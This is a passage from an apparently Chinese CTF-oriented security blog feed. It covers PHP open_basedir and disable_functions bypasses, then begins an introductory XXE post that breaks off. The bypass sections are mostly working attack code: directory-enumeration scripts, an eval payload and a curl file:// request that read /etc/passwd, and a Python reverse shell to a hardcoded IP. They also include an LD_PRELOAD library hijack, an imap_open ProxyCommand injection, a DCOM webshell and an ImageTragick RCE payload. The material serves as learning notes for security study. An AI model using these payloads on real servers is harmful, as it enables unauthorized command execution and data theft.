<p>利用原理是基于报错：<code>bindtextdomain()</code>函数的第二个参数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>i</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>y</mi><mtext>是一个文件路径，它会在</mtext></mrow><annotation encoding="application/x-tex">directory是一个文件路径，它会在</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">路</span><span class="mord cjk_fallback">径</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">它</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">在</span></span></span></span>directory存在的时候返回$directory，不存在则返回false。</p>
<p>Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而windows环境下一般是没有bindtextdomain函数的，linux环境是默认存在这个函数。<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250910171344853.png" alt="image-20250910171344853"></p>
<p><code>SplFileInfo</code>函数进行的操作类似。</p>
<p>poc</p>
<pre><code class="highlight plaintext">&lt;?php
printf(&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;, ini_get(&#x27;open_basedir&#x27;));
$re = bindtextdomain(&#x27;xxx&#x27;, $_GET[&#x27;dir&#x27;]);
var_dump($re);
?&gt;
&lt;?php
printf(&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;, ini_get(&#x27;open_basedir&#x27;));
$info = new SplFileInfo($_GET[&#x27;dir&#x27;]);
var_dump($info-&gt;getRealPath());
?&gt;</code></pre>
<p>如果访问到存在的文件就会返回该文件的路径,如果是不存在的路径就会返回<code>false</code></p>
<p>有点鸡肋但是爆爆还是可以出来</p>
<h3 id="利用splfileinfogetrealpath方法"><a class="markdownIt-Anchor" href="#利用splfileinfogetrealpath方法"></a> 利用SplFileInfo::getRealPath()方法</h3>
<p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)<br>
SplFileInfo类为单个文件的信息提供了一个高级的面向对象的接口。<br>
而其中<code>getRealPath()</code>用于获取文件的绝对路径。bypass原理同样是基于报错，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了open_basedir的设定。</p>
<p>可以用这个脚本来尝试遍历</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));
<span class="title function_ invoke__">printf</span>(<span class="string">&quot;open_basedir: %s \n&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));
<span class="variable">$basedir</span> = <span class="string">&quot;D:/phpstudy_pro/WWW/debug.io/&quot;</span>;
<span class="variable">$arr</span> = <span class="keyword">array</span>();
<span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;
<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123;
    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&lt;&#x27;</span>);
    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();
    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;
        <span class="keyword">echo</span> <span class="variable">$re</span>.<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250910180550554.png" alt></p>
<h3 id="利用realpath列目录"><a class="markdownIt-Anchor" href="#利用realpath列目录"></a> 利用realpath列目录</h3>
<p>要求环境是<strong>Windows</strong></p>
<p>realpath()返回规范化的绝对路径名,它可以去掉多余的…/或./等跳转字符，能将相对路径转换成绝对路径。</p>
<pre><code class="highlight php"><span class="title function_ invoke__">realpath</span>(<span class="keyword">string</span> <span class="variable">$path</span>): <span class="keyword">string</span>|<span class="literal">false</span></code></pre>
<p>如果我们传入一个不在open_basedir里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，有点像盲注,基于报错来判断文件名</p>
<p>可以用这个脚本来尝试遍历</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));
<span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));
<span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;isexists&#x27;</span>);
<span class="variable">$dir</span> = <span class="string">&#x27;D:/phpstudy_pro/WWW/&#x27;</span>;
<span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;
<span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;
<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123;
        <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;
        <span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>);
&#125;
<span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>
<span class="function"></span>&#123;
        <span class="variable">$regexp</span> = <span class="string">&#x27;/File\((.*)\) is not within/&#x27;</span>;
        <span class="title function_ invoke__">preg_match</span>(<span class="variable">$regexp</span>, <span class="variable">$errstr</span>, <span class="variable">$matches</span>);
        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$matches</span>[<span class="number">1</span>])) &#123;
                <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s &lt;br/&gt;&quot;</span>, <span class="variable">$matches</span>[<span class="number">1</span>]);
        &#125;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>这里要注意dir千万不能是当前open_basedir目录及其子目录下的文件，因为他们的访问不会触发报错，也就不会被捕捉打印</p>
<h3 id="gd库imageftbboximagefttext列举目录"><a class="markdownIt-Anchor" href="#gd库imageftbboximagefttext列举目录"></a> GD库imageftbbox/imagefttext列举目录</h3>
<p>GD库一般是PHP必备的扩展库之一</p>
<p>imageftbbox这个函数的第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。</p>
<p>也就是说，我们可以通过抛出错误的具体内容来判断一个文件是否存在。这个方法和realpath有相似性，都会抛出open_basedir的错误。</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));
<span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));
<span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;isexists&#x27;</span>);
<span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;
<span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;
<span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;
<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; 
    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;
    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span>
    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span>
    <span class="title function_ invoke__">imageftbbox</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);
&#125;
<span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>
<span class="function"></span>&#123;
    <span class="keyword">global</span> <span class="variable">$file</span>;
    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;
        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);
    &#125;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>但是我在本地没跑出来，不知道为什么…</p>
<h3 id="利用chdir与ini_set"><a class="markdownIt-Anchor" href="#利用chdir与ini_set"></a> 利用chdir与ini_set</h3>
<p>chdir我已经在无参数RCE中有所提及了，将工作目录切换到指定的目录</p>
<pre><code class="highlight plaintext">函数原型  chdir(string $directory): bool</code></pre>
<p><code>ini_set</code>i用来设置php.ini的值，无需打开php.ini文件，就能修改配置。函数原型为:</p>
<pre><code class="highlight plaintext">ini_set(string $option, string $value): string|false</code></pre>
<p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p>
<p>通过在eval中传入以下payload就可以</p>
<pre><code class="highlight plaintext">mkdir(&#x27;sub&#x27;);chdir(&#x27;sub&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);$a=file_get_contents(&#x27;/etc/passwd&#x27;);var_dump($a);</code></pre>
<h3 id="curl绕过"><a class="markdownIt-Anchor" href="#curl绕过"></a> Curl绕过</h3>
<pre><code class="highlight plaintext">$ch = curl_init(&#x27;file:///etc/passwd&#x27;);
curl_setopt($ch, CURLOPT_PROTOCOLS_STR, &quot;all&quot;);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
echo $data;
curl_close($ch);</code></pre>
<p>一键打爆</p>
<p>经过测试Apache是不行的，php-fpm可以，但是特定版本8.3，具体我也没仔细研究过</p>
<p>参考这[题](<a href="https://blog.kengwang.com.cn/archives/668/">LilCTF Web php-jail-is-my-cry 出题小记 - Kengwang 博客</a>)的配置吧</p>
<h2 id="disable_function绕过"><a class="markdownIt-Anchor" href="#disable_function绕过"></a> disable_function绕过</h2>
<p>网上找了找文章，绕法是真的多</p>
<h3 id="亿眼盯真"><a class="markdownIt-Anchor" href="#亿眼盯真"></a> 亿眼盯真</h3>
<p><code>phpinfo()</code>打开看看有没有遗漏的函数</p>
<p>再命令执行</p>
<p>可以看看有没有<code>pcntl_exec</code>这个插件</p>
<p>有的话就能利用它RCE</p>
<pre><code class="highlight plaintext">pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。

pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。

利用pcntl_exec()执行test.sh：

&lt;?php
if(function_exists(&#x27;pcntl_exec&#x27;)) &#123;
   pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/test.sh&quot;));
&#125; else &#123;
       echo &#x27;pcntl extension is not support!&#x27;;
&#125;
?&gt;
由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：

&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;,&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));</code></pre>
<h3 id="利用-ld_preload-环境变量"><a class="markdownIt-Anchor" href="#利用-ld_preload-环境变量"></a> 利用 LD_PRELOAD 环境变量</h3>
<p>LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库</p>
<ul>
<li>dll = windows 的动态链接库文件 把一些功能函数封装在dll文件中，调用时导入调用即可</li>
<li>so = linux 动态链接库文件</li>
</ul>
<p>总的来说就是=<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果</p>
<p>思路为:</p>
<ol>
<li>创建一个.so文件,linux的动态链接库文件</li>
<li>使用putenv函数将<code>LD_PRELOAD</code>路径设置为我们自己创建的动态链接库文件</li>
<li>利用某个函数去触发该动态链接库</li>
</ol>
<p>这里以<code>mail()</code>函数举例。<br>
在底层c语言中,<code>mail.c</code>中会调用<code>sendmail</code>，而sendmail_path使从ini文件中说明</p>
<pre><code class="highlight plaintext">; For Unix only.  You may supply arguments as well (default: &quot;sendmail -t -i&quot;). 
;sendmail_path =</code></pre>
<p>默认为&quot;sendmail -t -i&quot;</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini1.png" alt="phpini1"></p>
<p>但是sendmail并不是默认安装的,需要自己下载</p>
<p>使用命令<code>readelf -Ws /usr/sbin/sendmail</code>可以看到sendmail调用了哪些库函数,这里选择<code>geteuid</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini2.png" alt="phpini2"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini3.png" alt="phpini3"></p>
<p>创建一个<code>test.c</code>文件,并定义一个<code>geteuid</code>函数,目的是劫持该函数。</p>
<pre><code class="highlight plaintext">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() &#123;
    system(&quot;whoami &gt; /var/tmp/sd.txt&quot;);
&#125;
int geteuid()
&#123;
    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;
    unsetenv(&quot;LD_PRELOAD&quot;);
    payload();
&#125;</code></pre>
<p>使用gcc编译为.so文件</p>
<pre><code class="highlight plaintext">gcc -fPIC -shared -o test.so test.c</code></pre>
<p>这里有个坑:不要在windows上编译,编译出来是<code>MZ</code>头,不是<code>ELF</code>。</p>
<p>然后再上传test.so到指定目录下。</p>
<p>最后创建<code>shell.php</code>文件,上传到网站目录下,这里.so文件路径要写对。</p>
<pre><code class="highlight plaintext">&lt;?php
putenv(&quot;LD_PRELOAD=/var/www/test.so&quot;);
mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;</code></pre>
<p>再理一下整个过程:当我们访问shell.php文件的时候,先会将<code>LD_PRELOAD</code>路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的<code>whoami</code>命令写入到sd.txt中。</p>
<p>由于拿到的webshell很有可能是<code>www-data</code>这种普通权限。<br>
整个过程要注意权限问题,要可写的目录下。</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini4.png" alt="phpini4"></p>
<p>web访问页面没有文件写出,可以看看定义的目录是否有权限</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini5.png" alt="phpini5"></p>
<p>演示图均来自这位[师傅](<a href="https://xz.aliyun.com/news/9507">bypass disable_functions姿势总结-先知社区</a>)</p>
<h3 id="利用imap_open绕过"><a class="markdownIt-Anchor" href="#利用imap_open绕过"></a> 利用imap_open()绕过</h3>
<p>利用条件需要安装iamp扩展,命令行输入:<code>apt-get install php-imap</code><br>
在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。</p>
<p>基本原理为:</p>
<pre><code class="highlight plaintext">PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。</code></pre>
<p>EXP:</p>
<pre><code class="highlight plaintext">&lt;?php 
error_reporting(0); 
if (!function_exists(&#x27;imap_open&#x27;)) &#123; 
die(&quot;no imap_open function!&quot;); 
&#125; 
$server = &quot;x -oProxyCommand=echot&quot; . base64_encode($_GET[&#x27;cmd&#x27;] .
&quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64t-d|sh&#125;&quot;; 
//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] .
&quot;&gt;/tmp/cmd_result&quot;) . &#x27;|base64$IFS$()-d|sh&#125;&#x27;; 
imap_open(&#x27;&#123;&#x27; . $server . &#x27;:143/imap&#125;INBOX&#x27;, &#x27;&#x27;, &#x27;&#x27;); // or
var_dump(&quot;nnError: &quot;.imap_last_error()); 
sleep(5); 
echo file_get_contents(&quot;/tmp/cmd_result&quot;); 
?&gt;</code></pre>
<h3 id="windows组件dcom绕过"><a class="markdownIt-Anchor" href="#windows组件dcom绕过"></a> Windows组件DCOM绕过</h3>
<p>phpinfo查一下com.allow_dcom是不是打开了，开了就可以用</p>
<p>通过已有的webshell传入</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];
<span class="variable">$wsh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span>
<span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span>
<span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();
<span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();
<span class="keyword">echo</span> <span class="variable">$stroutput</span>;
<span class="meta">?&gt;</span></code></pre>
<h3 id="curl-任意库加载"><a class="markdownIt-Anchor" href="#curl-任意库加载"></a> curl 任意库加载</h3>
<p>上传恶意so文件加载共享库执行命令</p>
<p>可以使用</p>
<pre><code class="highlight bash">curl --engine <span class="string">&#x27;pwd&#x27;</span>/evil_engine.so https://example.com</code></pre>
<p>或者</p>
<pre><code class="highlight php"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSLENGINE,<span class="string">&quot;/tmp/1.so&quot;</span>);
<span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> <span class="variable">$data</span>;
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</code></pre>
<h3 id="蚁剑一把梭"><a class="markdownIt-Anchor" href="#蚁剑一把梭"></a> 蚁剑一把梭</h3>
<p>会用就可以了，也不用去深度了解之类的</p>
<h3 id="利用imagemagick-漏洞绕过cve-20163714"><a class="markdownIt-Anchor" href="#利用imagemagick-漏洞绕过cve-20163714"></a> 利用ImageMagick 漏洞绕过(CVE-2016–3714)</h3>
<p>利用条件:</p>
<ul>
<li>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</li>
<li>安装了php-imagick拓展并在php.ini中启用；</li>
<li>编写php通过new Imagick对象的方式来处理图片等格式文件；</li>
<li>PHP &gt;= 5.4</li>
</ul>
<p>利用ImageTragick可以打RCE</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;

<span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];
<span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;
    <span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;
&#125;

<span class="variable">$exploit</span> = <span class="string">&lt;&lt;&lt;EOF</span>
<span class="string">push graphic-context</span>
<span class="string">viewbox 0 0 640 480</span>
<span class="string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="subst">$command</span>&quot;)&#x27;</span>
<span class="string">pop graphic-context</span>
<span class="string">EOF</span>;

<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);
<span class="variable">$thumb</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();
<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="string">&#x27;KKKK.mvg&#x27;</span>);
<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;KKKK.png&#x27;</span>);
<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">clear</span>();
<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">destroy</span>();
<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.mvg&quot;</span>);
<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.png&quot;</span>);
<span class="meta">?&gt;</span></code></pre>
<h3 id="backtraceuaf"><a class="markdownIt-Anchor" href="#backtraceuaf"></a> BacktraceUAF</h3>
<p>利用条件</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP7.0 - all versions to date</li>
<li>PHP7.1 - all versions to date</li>
<li>PHP7.2 - all versions to date</li>
<li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li>
<li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li>
</ul>
<p><a href="https://bugs.php.net/bug.php?id=76047">利用漏洞</a><br>
<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">EXP</a></p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>初见XXE</title>
    <url>/2025/04/28/%E5%88%9D%E8%A7%81XXE/</url>
    <content><![CDATA[<h1 id="初见xxe"><a class="markdownIt-Anchor" href="#初见xxe"></a> 初见XXE</h1>
<p>这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。</p>
<h2 id="什么是xml呢"><a class="markdownIt-Anchor" href="#什么是xml呢"></a> 什么是XML呢</h2>
<p>XML，全称<strong>可扩展标记语言</strong>，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。</p>
<p>XML文档结构包括XML声明+DTD文档类型定义+文档元素</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;
&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;
&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;
&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;
&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;
&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;
&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;
&lt;/book&gt;                                                 &lt;!--book的结束--&gt;
&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre>
<p>其中<code>&lt;note&gt;</code>是根元素，每个XML文档必须包含一个根元素。</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
<h3 id="dtd"><a class="markdownIt-Anchor" href="#dtd"></a> DTD</h3>
<p><strong>DTD基本概念</strong><br>
XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>
DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br>
<strong>实体引用</strong><br>
XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; ' &quot;</code> 替换 <code>&lt; &gt; &amp; ' &quot;</code> 。<br>
实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。<br>
<strong>dtd的引入方式</strong><br>
DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br>
<em>内部 DTD</em><br>
使用内部的dtd文件，即将约束规则定义在xml文档中</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</code></pre>
<p>示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
]&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;/to&gt;
&lt;from&gt;@re&lt;/from&gt;
&lt;head&gt;v3ry&lt;/head&gt;
&lt;body&gt;g00d!&lt;/body&gt;
&lt;/note&gt;</code></pre>
<p><em>外部 DTD</em><br>
（1）引入外部的dtd文件</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre>
<p>（2）使用外部的dtd文件(网络上的dtd文件)</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>
<p>当使用外部DTD时，通过如下语法引入：</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre>
<p>示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;/to&gt;
&lt;from&gt;@re&lt;/from&gt;
&lt;head&gt;v3ry&lt;/head&gt;
&lt;body&gt;g00d!&lt;/body&gt;
&lt;/note&gt;</code></pre>
<p>test.dtd</p>
